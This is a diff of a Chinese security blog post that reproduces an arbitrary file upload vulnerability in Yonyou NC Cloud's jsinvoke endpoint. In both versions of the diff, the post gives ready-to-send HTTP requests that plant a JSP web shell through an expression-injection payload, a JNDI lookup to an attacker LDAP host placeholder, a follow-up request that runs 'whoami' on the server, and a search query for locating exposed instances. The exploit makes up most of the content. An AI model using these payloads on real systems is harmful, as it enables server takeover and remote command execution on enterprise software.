@@ -5,7 +5,7 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
         <title>用友 NC Cloud jsinvoke 任意文件上传漏洞 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="用友 NC Cloud jsinvoke 任意文件上传漏洞" />
-<meta property="og:description" content="用友 NC Cloud jsinvoke 任意文件上传漏洞 漏洞描述 用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限 app=&ldq" />
+<meta property="og:description" content="用友 NC Cloud jsinvoke 任意文件上传漏洞 漏洞描述 用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限 漏洞影响 用友 NC Cloud" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://example.org/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
@@ -15,12 +15,12 @@
 <meta name="twitter:image" content="http://example.org/logo.png"/>
 
 <meta name="twitter:title" content="用友 NC Cloud jsinvoke 任意文件上传漏洞"/>
-<meta name="twitter:description" content="用友 NC Cloud jsinvoke 任意文件上传漏洞 漏洞描述 用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限 app=&ldq"/>
+<meta name="twitter:description" content="用友 NC Cloud jsinvoke 任意文件上传漏洞 漏洞描述 用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限 漏洞影响 用友 NC Cloud"/>
 <meta name="twitter:site" content="@xxxx"/>
 <meta name="application-name" content="Chinchin&#39;s blog">
 <meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="http://example.org/%E7%94%A8%E5%8F%8B-nc-fsdcupdateservicefiles-%E8%B7%AF%E7%94%B1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="http://example.org/%E7%94%A8%E5%8F%8B-nc-baseapp-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="http://example.org/%E7%94%A8%E5%8F%8B-nc-cloud-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-c-2023-76801/" /><link rel="next" href="http://example.org/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -29,7 +29,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/example.org\/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E\/"
-        },"genre": "posts","keywords": "2023hw漏洞","wordcount":  240 ,
+        },"genre": "posts","keywords": "漏洞知识库","wordcount":  165 ,
         "url": "http:\/\/example.org\/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -104,8 +104,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">用友 NC Cloud jsinvoke 任意文件上传漏洞</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
-</span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw%E6%BC%8F%E6%B4%9E/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw漏洞</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;240 words&nbsp;
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;165 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;One minute&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="true">
                 <div class="details-summary toc-title">
@@ -114,16 +114,37 @@
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li><a href="#用友-nc-cloud-jsinvoke-任意文件上传漏洞">用友 NC Cloud jsinvoke 任意文件上传漏洞</a></li>
-    <li><a href="#写入webshell">写入webshell</a></li>
-    <li><a href="#执行命令">执行命令</a></li>
+    <li><a href="#漏洞描述">漏洞描述</a></li>
+    <li><a href="#漏洞影响">漏洞影响</a></li>
+    <li><a href="#网络测绘">网络测绘</a></li>
+    <li><a href="#漏洞复现">漏洞复现</a></li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><h2 id="用友-nc-cloud-jsinvoke-任意文件上传漏洞">用友 NC Cloud jsinvoke 任意文件上传漏洞</h2>
-<p>漏洞描述
-用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限
-app=&ldquo;用友-NC-Cloud&rdquo;</p>
-<h2 id="写入webshell">写入webshell</h2>
+            </div><div class="content" id="content"><h1 id="用友-nc-cloud-jsinvoke-任意文件上传漏洞">用友 NC Cloud jsinvoke 任意文件上传漏洞</h1>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限</p>
+<h2 id="漏洞影响">漏洞影响</h2>
+<p>用友 NC Cloud</p>
+<h2 id="网络测绘">网络测绘</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">app=&#34;用友-NC-Cloud&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="漏洞复现">漏洞复现</h2>
+<p>登陆页面</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/image-20230828164153665.png"
+        data-srcset="images/image-20230828164153665.png, images/image-20230828164153665.png 1.5x, images/image-20230828164153665.png 2x"
+        data-sizes="auto"
+        alt="images/image-20230828164153665.png"
+        title="image-20230828164153665" /></p>
+<p>验证POC</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -149,93 +170,58 @@ app=&ldquo;用友-NC-Cloud&rdquo;</p>
 </span><span class="lnt">21
 </span><span class="lnt">22
 </span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /uapjs/jsinvoke/?action=invoke
 </span></span><span class="line"><span class="cl">Content-Type: application/json
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">{
-</span></span><span class="line"><span class="cl">  &#34;serviceName&#34;: &#34;nc.itf.iufo.IBaseSPService&#34;,
-</span></span><span class="line"><span class="cl">  &#34;methodName&#34;: &#34;saveXStreamConfig&#34;,
-</span></span><span class="line"><span class="cl">  &#34;parameterTypes&#34;: [
-</span></span><span class="line"><span class="cl">    &#34;java.lang.Object&#34;,
-</span></span><span class="line"><span class="cl">    &#34;java.lang.String&#34;
-</span></span><span class="line"><span class="cl">  ],
-</span></span><span class="line"><span class="cl">  &#34;parameters&#34;: [
-</span></span><span class="line"><span class="cl">    &#34;${param.getClass().forName(param.error).newInstance().eval(param.cmd)}&#34;,
-</span></span><span class="line"><span class="cl">    &#34;webapps/nc_web/407.jsp&#34;
-</span></span><span class="line"><span class="cl">  ]
+</span></span><span class="line"><span class="cl">    &#34;serviceName&#34;:&#34;nc.itf.iufo.IBaseSPService&#34;,
+</span></span><span class="line"><span class="cl">    &#34;methodName&#34;:&#34;saveXStreamConfig&#34;,
+</span></span><span class="line"><span class="cl">    &#34;parameterTypes&#34;:[
+</span></span><span class="line"><span class="cl">        &#34;java.lang.Object&#34;,
+</span></span><span class="line"><span class="cl">        &#34;java.lang.String&#34;
+</span></span><span class="line"><span class="cl">    ], 
+</span></span><span class="line"><span class="cl">    &#34;parameters&#34;:[
+</span></span><span class="line"><span class="cl">        &#34;${param.getClass().forName(param.error).newInstance().eval(param.cmd)}&#34;,
+</span></span><span class="line"><span class="cl">        &#34;webapps/nc_web/407.jsp&#34;
+</span></span><span class="line"><span class="cl">    ]
 </span></span><span class="line"><span class="cl">}
-</span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
-</span></span><span class="line"><span class="cl">Host:
+</span></span><span class="line"><span class="cl">Host: 
 </span></span><span class="line"><span class="cl">Connection: Keep-Alive
 </span></span><span class="line"><span class="cl">Content-Length: 253
 </span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">{
-</span></span><span class="line"><span class="cl">  &#34;serviceName&#34;: &#34;nc.itf.iufo.IBaseSPService&#34;,
-</span></span><span class="line"><span class="cl">  &#34;methodName&#34;: &#34;saveXStreamConfig&#34;,
-</span></span><span class="line"><span class="cl">  &#34;parameterTypes&#34;: [
-</span></span><span class="line"><span class="cl">    &#34;java.lang.Object&#34;,
-</span></span><span class="line"><span class="cl">    &#34;java.lang.String&#34;
-</span></span><span class="line"><span class="cl">  ],
-</span></span><span class="line"><span class="cl">  &#34;parameters&#34;: [
-</span></span><span class="line"><span class="cl">    &#34;${&#39;&#39;.getClass().forName(&#39;javax.naming.InitialContext&#39;).newInstance().lookup(&#39;ldap://VPSip:1389/TomcatBypass/TomcatEcho&#39;)}&#34;,
-</span></span><span class="line"><span class="cl">    &#34;webapps/nc_web/301.jsp&#34;
-</span></span><span class="line"><span class="cl">  ]
-</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{&#34;serviceName&#34;:&#34;nc.itf.iufo.IBaseSPService&#34;,&#34;methodName&#34;:&#34;saveXStreamConfig&#34;,&#34;parameterTypes&#34;:[&#34;java.lang.Object&#34;,&#34;java.lang.String&#34;],&#34;parameters&#34;:[&#34;${&#39;&#39;.getClass().forName(&#39;javax.naming.InitialContext&#39;).newInstance().lookup(&#39;ldap://VPSip:1389/TomcatBypass/TomcatEcho&#39;)}&#34;,&#34;webapps/nc_web/301.jsp&#34;]}
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="执行命令">执行命令</h2>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/image-20230828164215853.png"
+        data-srcset="images/image-20230828164215853.png, images/image-20230828164215853.png 1.5x, images/image-20230828164215853.png 2x"
+        data-sizes="auto"
+        alt="images/image-20230828164215853.png"
+        title="image-20230828164215853" /></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">POST /407.jsp?error=bsh.Interpreter HTTP/1.1
-</span></span><span class="line"><span class="cl">Host: *
-</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
-</span></span><span class="line"><span class="cl">Accept: */*
-</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
-</span></span><span class="line"><span class="cl">Connection: close    
-</span></span><span class="line"><span class="cl">Cookie: JSESSIONID=80DA93FB2FFF0204E78FA82643D5BC6E
-</span></span><span class="line"><span class="cl">If-Modified-Since: Fri, 09 Dec 2022 16:12:59 GMT
-</span></span><span class="line"><span class="cl">If-None-Match: W/&#34;370397-1670602379000&#34;
-</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
-</span></span><span class="line"><span class="cl">Content-Length: 96
-</span></span><span class="line"><span class="cl">           
-</span></span><span class="line"><span class="cl">cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(&#34;whoami&#34;).getInputStream())
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/cmdtest.jsp?error=bsh.Interpreter&amp;cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream()) 
 </span></span></code></pre></td></tr></table>
 </div>
-</div></div><div class="post-footer" id="post-footer">
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/image-20230828164239659.png"
+        data-srcset="images/image-20230828164239659.png, images/image-20230828164239659.png 1.5x, images/image-20230828164239659.png 2x"
+        data-sizes="auto"
+        alt="images/image-20230828164239659.png"
+        title="image-20230828164239659" /></p>
+</div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
@@ -246,20 +232,20 @@ app=&ldquo;用友-NC-Cloud&rdquo;</p>
                             <a class="link-to-markdown" href="/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.md" target="_blank">Read Markdown</a>
                         </span></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="用友 NC Cloud jsinvoke 任意文件上传漏洞" data-via="xxxx" data-hashtags="2023hw漏洞"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-hashtag="2023hw漏洞"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="用友 NC Cloud jsinvoke 任意文件上传漏洞"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="用友 NC Cloud jsinvoke 任意文件上传漏洞"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="用友 NC Cloud jsinvoke 任意文件上传漏洞"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="用友 NC Cloud jsinvoke 任意文件上传漏洞" data-via="xxxx" data-hashtags="漏洞知识库"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-hashtag="漏洞知识库"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="用友 NC Cloud jsinvoke 任意文件上传漏洞"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="用友 NC Cloud jsinvoke 任意文件上传漏洞"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="用友 NC Cloud jsinvoke 任意文件上传漏洞"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw%E6%BC%8F%E6%B4%9E/">2023hw漏洞</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/%E7%94%A8%E5%8F%8B-nc-fsdcupdateservicefiles-%E8%B7%AF%E7%94%B1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="prev" rel="prev" title="用友 NC fsdcupdateServicefiles 路由命令执行漏洞"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>用友 NC fsdcupdateServicefiles 路由命令执行漏洞</a>
-            <a href="/%E7%94%A8%E5%8F%8B-nc-baseapp-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="用友 NC BaseApp 文件上传漏洞">用友 NC BaseApp 文件上传漏洞<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+    <div class="post-nav"><a href="/%E7%94%A8%E5%8F%8B-nc-cloud-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-c-2023-76801/" class="prev" rel="prev" title="用友 NC Cloud 远程代码执行漏洞 CNVD-C-2023-76801"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>用友 NC Cloud 远程代码执行漏洞 CNVD-C-2023-76801</a>
+            <a href="/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="用友 NC Cloud jsinvoke 任意文件上传漏洞">用友 NC Cloud jsinvoke 任意文件上传漏洞<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
 </article></div>
             </main><footer class="footer">
